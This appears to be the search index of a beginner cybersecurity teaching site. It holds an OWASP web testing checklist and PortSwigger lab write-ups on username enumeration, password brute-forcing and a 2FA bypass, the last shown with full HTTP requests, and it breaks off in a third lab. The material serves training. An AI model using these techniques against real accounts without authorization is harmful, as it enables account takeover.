{"config":{"separator":"[\\s\\-_,:!=\\[\\]()\\\\\"`/]+|\\.(?!\\d)"},"items":[{"location":"","level":1,"title":"Home","text":"","path":["Home"],"tags":[]},{"location":"#about-me","level":2,"title":"About Me","text":"<p>My name is Tom. I'm a husband, father, and grandfather. After I retired from the Army in 2022, I worked as a penetration tester for a few years before gravitating toward teaching. I'm now in the process of getting my own project off the ground. I started Eagle Rising Information Security to provide high-quality foundational cybersecurity content to students (or anyone else getting started). My goal is to present information in an easy to understand way, and in a manner which is accessible for anyone, regardless of where they are in their information security journey. </p>","path":["Home"],"tags":[]},{"location":"#my-philosophy","level":2,"title":"My Philosophy","text":"<ul> <li>Cybersecurity can be learned. Nobody is born just knowing all this. </li> <li>Don't try to learn everything all at once. Try to get 1% better every day.</li> <li>Everyone learns differently. Try to avoid comparing yourself to others. You don't owe anyone anything.</li> <li>Find your own flow.  Reach out on Discord</li> </ul>","path":["Home"],"tags":[]},{"location":"Interview-Questions/","level":1,"title":"References","text":"","path":["Interview Questions","References"],"tags":[]},{"location":"Interview-Questions/#general","level":2,"title":"General","text":"<p>Describe the difference between encryption and encoding</p>","path":["Interview Questions","References"],"tags":[]},{"location":"Interview-Questions/general/encryption-vs-encoding/","level":1,"title":"Describe the difference between encryption and encoding","text":"<p>Coming soon.</p>","path":["Interview Questions","General","Describe the difference between encryption and encoding"],"tags":[]},{"location":"projects/","level":1,"title":"Personal Projects","text":"<p>ðŸš§ Coming Soon ðŸš§</p>","path":["Projects","Personal Projects"],"tags":[]},{"location":"resources/","level":1,"title":"Resources","text":"<p>Multiple resources, how-tos, and methodologies. Constantly updated.</p>","path":["Resources"],"tags":[]},{"location":"resources/How-To/Create-an-Ubuntu-VM/","level":1,"title":"Create an Ubuntu VM","text":"<p>This article will walk through creating an Ubuntu virtual machine on Windows and MacOS.</p>","path":["Resources","How To","Create an Ubuntu VM"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/","level":1,"title":"OWASP Web Security Testing Guide (WSTG) Checklist","text":"<p>This checklist is based on the OWASP Web Security Testing Guide and provides a comprehensive framework for testing web application security. Each test includes objectives to guide your testing approach.</p>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#information-gathering","level":2,"title":"Information Gathering","text":"<ul> <li> <p> WSTG-INFO-01 - Conduct Search Engine Discovery Reconnaissance for Information Leakage</p> </li> <li> <p>Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's site) or indirectly (via third-party services).</p> </li> <li> <p> WSTG-INFO-02 - Fingerprint Web Server</p> </li> <li> <p>Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.</p> </li> <li> <p> WSTG-INFO-03 - Review Webserver Metafiles for Information Leakage</p> </li> <li> <p>Identify hidden or obfuscated paths and functionality through the analysis of metadata files.</p> </li> <li> <p>Extract and map other information that could lead to a better understanding of the systems at hand.</p> </li> <li> <p> WSTG-INFO-04 - Enumerate Applications on Webserver</p> </li> <li> <p>Enumerate the applications within the scope that exist on a web server.</p> </li> <li> <p> WSTG-INFO-05 - Review Web Page Content for Information Leakage</p> </li> <li> <p>Review web page comments, metadata, and redirect bodies to find any information leakage.</p> </li> <li>Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.</li> <li> <p>Identify if source map files or other frontend debug files exist.</p> </li> <li> <p> WSTG-INFO-06 - Identify Application Entry Points</p> </li> <li> <p>Identify possible entry and injection points through request and response analysis.</p> </li> <li> <p> WSTG-INFO-07 - Map Execution Paths Through Application</p> </li> <li> <p>Map the target application and understand the principal workflows.</p> </li> <li> <p> WSTG-INFO-08 - Fingerprint Web Application Framework</p> </li> <li> <p>Fingerprint the components used by the web applications.</p> </li> <li> <p> WSTG-INFO-09 - Fingerprint Web Application</p> </li> <li> <p> WSTG-INFO-10 - Map Application Architecture</p> </li> <li>Understand the architecture of the application and the technologies in use.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#configuration-and-deployment-management-testing","level":2,"title":"Configuration and Deployment Management Testing","text":"<ul> <li> <p> WSTG-CONF-01 - Test Network Infrastructure Configuration</p> </li> <li> <p>Review the applications' configurations set across the network and validate that they are not vulnerable.</p> </li> <li> <p>Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.</p> </li> <li> <p> WSTG-CONF-02 - Test Application Platform Configuration</p> </li> <li> <p>Ensure that default and known files have been removed.</p> </li> <li>Validate that no debugging code or extensions are left in the production environments.</li> <li> <p>Review the logging mechanisms set in place for the application.</p> </li> <li> <p> WSTG-CONF-03 - Test File Extensions Handling for Sensitive Information</p> </li> <li> <p>Brute force sensitive file extensions that might contain raw data such as scripts, credentials, etc.</p> </li> <li> <p>Validate that no system framework bypasses exist for the rules that have been set.</p> </li> <li> <p> WSTG-CONF-04 - Review Old Backup and Unreferenced Files for Sensitive Information</p> </li> <li> <p>Find and analyse unreferenced files that might contain sensitive information.</p> </li> <li> <p> WSTG-CONF-05 - Enumerate Infrastructure and Application Admin Interfaces</p> </li> <li> <p>Identify hidden administrator interfaces and functionality.</p> </li> <li> <p> WSTG-CONF-06 - Test HTTP Methods</p> </li> <li> <p>Enumerate supported HTTP methods.</p> </li> <li>Test for access control bypass.</li> <li> <p>Test HTTP method overriding techniques.</p> </li> <li> <p> WSTG-CONF-07 - Test HTTP Strict Transport Security</p> </li> <li> <p>Review the HSTS header and its validity.</p> </li> <li> <p> WSTG-CONF-08 - Test RIA Cross Domain Policy</p> </li> <li> <p> WSTG-CONF-09 - Test File Permission</p> </li> <li> <p>Review and identify any rogue file permissions.</p> </li> <li> <p> WSTG-CONF-10 - Test for Subdomain Takeover</p> </li> <li> <p>Enumerate all possible domains (previous and current).</p> </li> <li> <p>Identify any forgotten or misconfigured domains.</p> </li> <li> <p> WSTG-CONF-11 - Test Cloud Storage</p> </li> <li> <p>Assess that the access control configuration for the storage services is properly in place.</p> </li> <li> <p> WSTG-CONF-12 - Testing for Content Security Policy</p> </li> <li> <p>Review the Content-Security-Policy header or meta element to identify misconfigurations.</p> </li> <li> <p> WSTG-CONF-13 - Test Path Confusion</p> </li> <li> <p>Make sure application paths are configured correctly.</p> </li> <li> <p> WSTG-CONF-14 - Test Other HTTP Security Header Misconfigurations</p> </li> <li>Identify improperly configured security headers.</li> <li>Assess the impact of misconfigured security headers.</li> <li>Validate the correct implementation of required security headers.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#identity-management-testing","level":2,"title":"Identity Management Testing","text":"<ul> <li> <p> WSTG-IDNT-01 - Test Role Definitions</p> </li> <li> <p>Identify and document roles used by the application.</p> </li> <li>Attempt to switch, change, or access another role.</li> <li> <p>Review the granularity of the roles and the needs behind the permissions given.</p> </li> <li> <p> WSTG-IDNT-02 - Test User Registration Process</p> </li> <li> <p>Verify that the identity requirements for user registration are aligned with business and security requirements.</p> </li> <li> <p>Validate the registration process.</p> </li> <li> <p> WSTG-IDNT-03 - Test Account Provisioning Process</p> </li> <li> <p>Verify which accounts may provision other accounts and of what type.</p> </li> <li> <p> WSTG-IDNT-04 - Testing for Account Enumeration and Guessable User Account</p> </li> <li> <p>Review processes that pertain to user identification (e.g. registration, login, etc.).</p> </li> <li> <p>Enumerate users where possible through response analysis.</p> </li> <li> <p> WSTG-IDNT-05 - Testing for Weak or Unenforced Username Policy</p> </li> <li>Determine whether a consistent account name structure renders the application vulnerable to account enumeration.</li> <li>Determine whether the application's error messages permit account enumeration.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#authentication-testing","level":2,"title":"Authentication Testing","text":"<ul> <li> <p> WSTG-ATHN-01 - Testing for Credentials Transported over an Encrypted Channel</p> </li> <li> <p> WSTG-ATHN-02 - Testing for Default Credentials</p> </li> <li> <p>Determine whether the application has any user accounts with default passwords.</p> </li> <li> <p>Review whether new user accounts are created with weak or predictable passwords.</p> </li> <li> <p> WSTG-ATHN-03 - Testing for Weak Lock Out Mechanism</p> </li> <li> <p>Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.</p> </li> <li> <p>Evaluate the unlock mechanism's resistance to unauthorized account unlocking.</p> </li> <li> <p> WSTG-ATHN-04 - Testing for Bypassing Authentication Schema</p> </li> <li> <p>Ensure that authentication is applied across all services that require it.</p> </li> <li> <p> WSTG-ATHN-05 - Testing for Vulnerable Remember Password</p> </li> <li> <p>Validate that the generated session is managed securely and do not put the user's credentials in danger.</p> </li> <li> <p> WSTG-ATHN-06 - Testing for Browser Cache Weaknesses</p> </li> <li> <p>Review if the application stores sensitive information on the client-side.</p> </li> <li> <p>Review if access can occur without authorization.</p> </li> <li> <p> WSTG-ATHN-07 - Testing for Weak Authentication Methods</p> </li> <li> <p>Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.</p> </li> <li> <p> WSTG-ATHN-08 - Testing for Weak Security Question Answer</p> </li> <li> <p>Determine the complexity and how straight-forward the questions are.</p> </li> <li> <p>Assess possible user answers and brute force capabilities.</p> </li> <li> <p> WSTG-ATHN-09 - Testing for Weak Password Change or Reset Functionalities</p> </li> <li> <p>Determine whether the password change and reset functionality allows accounts to be compromised.</p> </li> <li> <p> WSTG-ATHN-10 - Testing for Weaker Authentication in Alternative Channel</p> </li> <li> <p>Identify alternative authentication channels.</p> </li> <li> <p>Assess the security measures used and if any bypasses exists on the alternative channels.</p> </li> <li> <p> WSTG-ATHN-11 - Testing Multi-Factor Authentication (MFA)</p> </li> <li>Identify the type of MFA used by the application.</li> <li>Determine whether the MFA implementation is robust and secure.</li> <li>Attempt to bypass the MFA.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#authorization-testing","level":2,"title":"Authorization Testing","text":"<ul> <li> <p> WSTG-ATHZ-01 - Testing Directory Traversal File Include</p> </li> <li> <p>Identify injection points that pertain to path traversal.</p> </li> <li> <p>Assess bypassing techniques and identify the extent of path traversal.</p> </li> <li> <p> WSTG-ATHZ-02 - Testing for Bypassing Authorization Schema</p> </li> <li> <p>Assess if unauthenticated, horizontal, or vertical access is possible.</p> </li> <li> <p> WSTG-ATHZ-03 - Testing for Privilege Escalation</p> </li> <li> <p>Identify injection points related to privilege manipulation.</p> </li> <li> <p>Fuzz or otherwise attempt to bypass security measures.</p> </li> <li> <p> WSTG-ATHZ-04 - Testing for Insecure Direct Object References</p> </li> <li> <p>Identify points where object references may occur.</p> </li> <li> <p>Assess the access control measures and if they're vulnerable to IDOR.</p> </li> <li> <p> WSTG-ATHZ-05 - Testing for OAuth Weaknesses</p> </li> <li>Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#session-management-testing","level":2,"title":"Session Management Testing","text":"<ul> <li> <p> WSTG-SESS-01 - Testing for Session Management Schema</p> </li> <li> <p>Gather session tokens, for the same user and for different users where possible.</p> </li> <li>Analyze and ensure that enough randomness exists to stop session forging attacks.</li> <li> <p>Modify cookies that are not signed and contain information that can be manipulated.</p> </li> <li> <p> WSTG-SESS-02 - Testing for Cookies Attributes</p> </li> <li> <p>Ensure that the proper security configuration is set for cookies.</p> </li> <li> <p> WSTG-SESS-03 - Testing for Session Fixation</p> </li> <li> <p>Analyze the authentication mechanism and its flow.</p> </li> <li> <p>Force cookies and assess the impact.</p> </li> <li> <p> WSTG-SESS-04 - Testing for Exposed Session Variables</p> </li> <li> <p>Ensure that proper encryption is implemented.</p> </li> <li>Review the caching configuration.</li> <li> <p>Assess the channel and methods' security.</p> </li> <li> <p> WSTG-SESS-05 - Testing for Cross Site Request Forgery</p> </li> <li> <p>Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.</p> </li> <li> <p> WSTG-SESS-06 - Testing for Logout Functionality</p> </li> <li> <p>Assess the logout UI.</p> </li> <li> <p>Analyze the session timeout and if the session is properly killed after logout.</p> </li> <li> <p> WSTG-SESS-07 - Testing Session Timeout</p> </li> <li> <p>Validate that a hard session timeout exists.</p> </li> <li> <p> WSTG-SESS-08 - Testing for Session Puzzling</p> </li> <li> <p>Identify all session variables.</p> </li> <li> <p>Break the logical flow of session generation.</p> </li> <li> <p> WSTG-SESS-09 - Testing for Session Hijacking</p> </li> <li> <p>Identify vulnerable session cookies.</p> </li> <li> <p>Hijack vulnerable cookies and assess the risk level.</p> </li> <li> <p> WSTG-SESS-10 - Testing JSON Web Tokens</p> </li> <li> <p>Determine whether the JWTs expose sensitive information.</p> </li> <li> <p>Determine whether the JWTs can be tampered with or modified.</p> </li> <li> <p> WSTG-SESS-11 - Testing for Concurrent Sessions</p> </li> <li>Evaluate the application's session management by assessing the handling of multiple active sessions for a single user account.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#input-validation-testing","level":2,"title":"Input Validation Testing","text":"<ul> <li> <p> WSTG-INPV-01 - Testing for Reflected Cross Site Scripting</p> </li> <li> <p>Identify variables that are reflected in responses.</p> </li> <li> <p>Assess the input they accept and the encoding that gets applied on return (if any).</p> </li> <li> <p> WSTG-INPV-02 - Testing for Stored Cross Site Scripting</p> </li> <li> <p>Identify stored input that is reflected on the client-side.</p> </li> <li> <p>Assess the input they accept and the encoding that gets applied on return (if any).</p> </li> <li> <p> WSTG-INPV-03 - Testing for HTTP Verb Tampering</p> </li> <li> <p> WSTG-INPV-04 - Testing for HTTP Parameter Pollution</p> </li> <li> <p>Identify the backend and the parsing method used.</p> </li> <li> <p>Assess injection points and try bypassing input filters using HPP.</p> </li> <li> <p> WSTG-INPV-05 - Testing for SQL Injection</p> </li> <li> <p>Identify SQL injection points.</p> </li> <li> <p>Assess the severity of the injection and the level of access that can be achieved through it.</p> </li> <li> <p> WSTG-INPV-06 - Testing for LDAP Injection</p> </li> <li> <p>Identify LDAP injection points.</p> </li> <li> <p>Assess the severity of the injection.</p> </li> <li> <p> WSTG-INPV-07 - Testing for XML Injection</p> </li> <li> <p>Identify XML injection points.</p> </li> <li> <p>Assess the types of exploits that can be attained and their severities.</p> </li> <li> <p> WSTG-INPV-08 - Testing for SSI Injection</p> </li> <li> <p>Identify SSI injection points.</p> </li> <li> <p>Assess the severity of the injection.</p> </li> <li> <p> WSTG-INPV-09 - Testing for XPath Injection</p> </li> <li> <p>Identify XPATH injection points.</p> </li> <li> <p> WSTG-INPV-10 - Testing for IMAP SMTP Injection</p> </li> <li> <p>Identify IMAP/SMTP injection points.</p> </li> <li>Understand the data flow and deployment structure of the system.</li> <li> <p>Assess the injection impacts.</p> </li> <li> <p> WSTG-INPV-11 - Testing for Code Injection</p> </li> <li> <p>Identify injection points where you can inject code into the application.</p> </li> <li> <p>Assess the injection severity.</p> </li> <li> <p> WSTG-INPV-12 - Testing for Command Injection</p> </li> <li> <p>Identify and assess the command injection points.</p> </li> <li> <p> WSTG-INPV-13 - Testing for Buffer Overflow</p> </li> <li> <p> WSTG-INPV-13 - Testing for Format String Injection</p> </li> <li> <p>Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.</p> </li> <li> <p> WSTG-INPV-14 - Testing for Incubated Vulnerability</p> </li> <li> <p>Identify injections that are stored and require a recall step to the stored injection.</p> </li> <li>Understand how a recall step could occur.</li> <li> <p>Set listeners or activate the recall step if possible.</p> </li> <li> <p> WSTG-INPV-15 - Testing for HTTP Splitting Smuggling</p> </li> <li> <p>Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.</p> </li> <li> <p>Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.</p> </li> <li> <p> WSTG-INPV-16 - Testing for HTTP Incoming Requests</p> </li> <li> <p>Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.</p> </li> <li> <p>Monitor HTTP traffic without changes of end user Browser proxy or client-side application.</p> </li> <li> <p> WSTG-INPV-17 - Testing for Host Header Injection</p> </li> <li> <p>Assess if the Host header is being parsed dynamically in the application.</p> </li> <li> <p>Bypass security controls that rely on the header.</p> </li> <li> <p> WSTG-INPV-18 - Testing for Server-side Template Injection</p> </li> <li> <p>Detect template injection vulnerability points.</p> </li> <li>Identify the templating engine.</li> <li> <p>Build the exploit.</p> </li> <li> <p> WSTG-INPV-19 - Testing for Server-Side Request Forgery</p> </li> <li> <p>Identify SSRF injection points.</p> </li> <li>Test if the injection points are exploitable.</li> <li> <p>Asses the severity of the vulnerability.</p> </li> <li> <p> WSTG-INPV-20 - Testing for Mass Assignment</p> </li> <li>Identify requests that modify objects</li> <li>Assess if it is possible to modify fields never intended to be modified from outside</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#testing-for-error-handling","level":2,"title":"Testing for Error Handling","text":"<ul> <li> <p> WSTG-ERRH-01 - Testing for Improper Error Handling</p> </li> <li> <p>Identify existing error output.</p> </li> <li> <p>Analyze the different output returned.</p> </li> <li> <p> WSTG-ERRH-02 - Testing for Stack Traces</p> </li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#testing-for-weak-cryptography","level":2,"title":"Testing for Weak Cryptography","text":"<ul> <li> <p> WSTG-CRYP-01 - Testing for Weak Transport Layer Security</p> </li> <li> <p>Validate the service configuration.</p> </li> <li>Review the digital certificate's cryptographic strength and validity.</li> <li> <p>Ensure that the TLS security is not bypassable and is properly implemented across the application.</p> </li> <li> <p> WSTG-CRYP-02 - Testing for Padding Oracle</p> </li> <li> <p>Identify encrypted messages that rely on padding.</p> </li> <li> <p>Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.</p> </li> <li> <p> WSTG-CRYP-03 - Testing for Sensitive Information Sent via Unencrypted Channels</p> </li> <li> <p>Identify sensitive information transmitted through the various channels.</p> </li> <li> <p>Assess the privacy and security of the channels used.</p> </li> <li> <p> WSTG-CRYP-04 - Testing for Weak Encryption</p> </li> <li>Provide a guideline for the identification weak encryption or hashing uses and implementations.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#business-logic-testing","level":2,"title":"Business Logic Testing","text":"<ul> <li> <p> WSTG-BUSL-01 - Test Business Logic Data Validation</p> </li> <li> <p>Identify data injection points.</p> </li> <li>Validate that all checks are occurring on the backend and can't be bypassed.</li> <li> <p>Attempt to break the format of the expected data and analyze how the application is handling it.</p> </li> <li> <p> WSTG-BUSL-02 - Test Ability to Forge Requests</p> </li> <li> <p>Review the project documentation looking for guessable, predictable, or hidden functionality of fields.</p> </li> <li> <p>Insert logically valid data in order to bypass normal business logic workflow.</p> </li> <li> <p> WSTG-BUSL-03 - Test Integrity Checks</p> </li> <li> <p>Review the project documentation for components of the system that move, store, or handle data.</p> </li> <li>Determine what type of data is logically acceptable by the component and what types the system should guard against.</li> <li>Determine who should be allowed to modify or read that data in each component.</li> <li> <p>Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.</p> </li> <li> <p> WSTG-BUSL-04 - Test for Process Timing</p> </li> <li> <p>Review the project documentation for system functionality that may be impacted by time.</p> </li> <li> <p>Develop and execute misuse cases.</p> </li> <li> <p> WSTG-BUSL-05 - Test Number of Times a Function Can Be Used Limits</p> </li> <li> <p>Identify functions that must set limits to the times they can be called.</p> </li> <li> <p>Assess if there is a logical limit set on the functions and if it is properly validated.</p> </li> <li> <p> WSTG-BUSL-06 - Testing for the Circumvention of Work Flows</p> </li> <li> <p>Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.</p> </li> <li> <p>Develop a misuse case and try to circumvent every logic flow identified.</p> </li> <li> <p> WSTG-BUSL-07 - Test Defenses Against Application Misuse</p> </li> <li> <p>Generate notes from all tests conducted against the system.</p> </li> <li>Review which tests had a different functionality based on aggressive input.</li> <li> <p>Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.</p> </li> <li> <p> WSTG-BUSL-08 - Test Upload of Unexpected File Types</p> </li> <li> <p>Review the project documentation for file types that are rejected by the system.</p> </li> <li>Verify that the unwelcomed file types are rejected and handled safely.</li> <li> <p>Verify that file batch uploads are secure and do not allow any bypass against the set security measures.</p> </li> <li> <p> WSTG-BUSL-09 - Test Upload of Malicious Files</p> </li> <li> <p>Identify the file upload functionality.</p> </li> <li>Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.</li> <li>If documentation is not available then consider what would be appropriate based on the purpose of the application.</li> <li>Determine how the uploaded files are processed.</li> <li>Obtain or create a set of malicious files for testing.</li> <li> <p>Try to upload the malicious files to the application and determine whether it is accepted and processed.</p> </li> <li> <p> WSTG-BUSL-10 - Test Payment Functionality</p> </li> <li>Determine whether the business logic for the e-commerce functionality is robust.</li> <li>Understand how the payment functionality works.</li> <li>Determine whether the payment functionality is secure.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#client-side-testing","level":2,"title":"Client-side Testing","text":"<ul> <li> <p> WSTG-CLNT-01 - Testing for DOM-Based Cross Site Scripting</p> </li> <li> <p>Identify DOM sinks.</p> </li> <li> <p>Build payloads that pertain to every sink type.</p> </li> <li> <p> WSTG-CLNT-02 - Testing for JavaScript Execution</p> </li> <li> <p>Identify sinks and possible JavaScript injection points.</p> </li> <li> <p> WSTG-CLNT-03 - Testing for HTML Injection</p> </li> <li> <p>Identify HTML injection points and assess the severity of the injected content.</p> </li> <li> <p> WSTG-CLNT-04 - Testing for Client-side URL Redirect</p> </li> <li> <p>Identify injection points that handle URLs or paths.</p> </li> <li> <p>Assess the locations that the system could redirect to.</p> </li> <li> <p> WSTG-CLNT-05 - Testing for CSS Injection</p> </li> <li> <p>Identify CSS injection points.</p> </li> <li> <p>Assess the impact of the injection.</p> </li> <li> <p> WSTG-CLNT-06 - Testing for Client-side Resource Manipulation</p> </li> <li> <p>Identify sinks with weak input validation.</p> </li> <li> <p>Assess the impact of the resource manipulation.</p> </li> <li> <p> WSTG-CLNT-07 - Testing Cross Origin Resource Sharing</p> </li> <li> <p>Identify endpoints that implement CORS.</p> </li> <li> <p>Ensure that the CORS configuration is secure or harmless.</p> </li> <li> <p> WSTG-CLNT-08 - Testing for Cross Site Flashing</p> </li> <li> <p>Decompile and analyze the application's code.</p> </li> <li> <p>Assess sinks inputs and unsafe method usages.</p> </li> <li> <p> WSTG-CLNT-09 - Testing for Clickjacking</p> </li> <li> <p>Assess application vulnerability to clickjacking attacks.</p> </li> <li> <p> WSTG-CLNT-10 - Testing WebSockets</p> </li> <li> <p>Identify the usage of WebSockets.</p> </li> <li> <p>Assess its implementation by using the same tests on normal HTTP channels.</p> </li> <li> <p> WSTG-CLNT-11 - Testing Web Messaging</p> </li> <li> <p>Assess the security of the message's origin.</p> </li> <li> <p>Validate that it's using safe methods and validating its input.</p> </li> <li> <p> WSTG-CLNT-12 - Testing Browser Storage</p> </li> <li> <p>Determine whether the website is storing sensitive data in client-side storage.</p> </li> <li> <p>The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.</p> </li> <li> <p> WSTG-CLNT-13 - Testing for Cross Site Script Inclusion</p> </li> <li> <p>Locate sensitive data across the system.</p> </li> <li> <p>Assess the leakage of sensitive data through various techniques.</p> </li> <li> <p> WSTG-CLNT-14 - Testing for Reverse Tabnabbing</p> </li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/Methodology/OWASP-WSTG/wstg/#api-testing","level":2,"title":"API Testing","text":"<ul> <li> <p> WSTG-APIT-01 - API Reconnaissance</p> </li> <li> <p>Find all API endpoints supported by the backend server code, documented or undocumented.</p> </li> <li>Find all parameters for each endpoint supported by the backend server, documented or undocumented.</li> <li> <p>Discover interesting data related to APIs in HTML and JavaScript sent to clients.</p> </li> <li> <p> WSTG-APIT-02 - API Broken Object Level Authorization</p> </li> <li> <p>The objective of this test is to identify whether the API enforces proper object-level authorization checks, ensuring that users can only access and manipulate objects they are authorized to interact with.</p> </li> <li> <p> WSTG-APIT-99 - Testing GraphQL</p> </li> <li>Assess that a secure and production-ready configuration is deployed.</li> <li>Validate all input fields against generic attacks.</li> <li>Ensure that proper access controls are applied.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"resources/PortSwigger/Authentication/authn-lab-1/","level":1,"title":"Username enumeration via different responses","text":"","path":["Resources","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:</p> <ul> <li>Candidate usernames</li> <li>Candidate passwords</li> </ul> <p>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.</p>","path":["Resources","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-1/#solution","level":2,"title":"Solution","text":"<p>When attempting to login with <code>tester:tester</code>, we get a message saying \"Invalid username\".</p> <p></p> <p>We can send the login request to intruder and select the username parameter. Add the list of usernames provided for this lab.</p> <p>One of the requests has a different error message, indicating an incorrect password instead of an invalid username. </p> <p></p> <p>Now we have a username, so we can just send this request back to intruder, and brute force the password with the list provided. </p> <p>Again, one of the requests is slightly different.</p> <p></p> <p>Log in with these credentials and solve the lab.</p>","path":["Resources","PortSwigger","Authentication","Username enumeration via different responses"],"tags":["authn","username-enum"]},{"location":"resources/PortSwigger/Authentication/authn-lab-2/","level":1,"title":"2FA simple bypass","text":"","path":["Resources","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.</p> <ul> <li>Your credentials:Â <code>wiener:peter</code></li> <li>Victim's credentialsÂ <code>carlos:montoya</code></li> </ul>","path":["Resources","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-2/#solution","level":2,"title":"Solution","text":"<p>First, we can log into our own account and see how the login flow works. </p> <p>After entering our credentials, we're presented a form to submit our MFA code. </p> <p></p> <p>We can check the email for the MFA code.</p> <p> The following request sends the MFA code</p> Sending the MFA code<pre><code>POST /login2 HTTP/2\nHost: 0a89006a043eb46681d875b500b800fa.web-security-academy.net\nCookie: session=Dgm7XzPmB67vOBpTUJ3KoviUjiPBwhnk\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\nOrigin: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net\nReferer: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\nmfa-code=0441\n</code></pre> <p>Then the subsequent request is:</p> Post MFA request<pre><code>GET /my-account?id=wiener HTTP/2\nHost: 0a89006a043eb46681d875b500b800fa.web-security-academy.net\nCookie: session=aUOSkOrcURGd8Pt7uCh5HprVwH1zJE73\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a89006a043eb46681d875b500b800fa.web-security-academy.net/login2\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n</code></pre> <p>What happens if we try to bypass the second login request where we send the MFA code and access the my-account page directly?</p> <p>Note there is no POST request to the /login2 endpoint.</p> <p></p> <p>We're able to navigate directly past the MFA prompt and solve the lab.</p> <p></p>","path":["Resources","PortSwigger","Authentication","2FA simple bypass"],"tags":["authn","mfa"]},{"location":"resources/PortSwigger/Authentication/authn-lab-3/","level":1,"title":"Password reset broken logic","text":"","path":["Resources","PortSwigger","Authentication","Password reset broken logic"],"tags":["authn","password-reset"]},{"location":"resources/PortSwigger/Authentication/authn-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab's 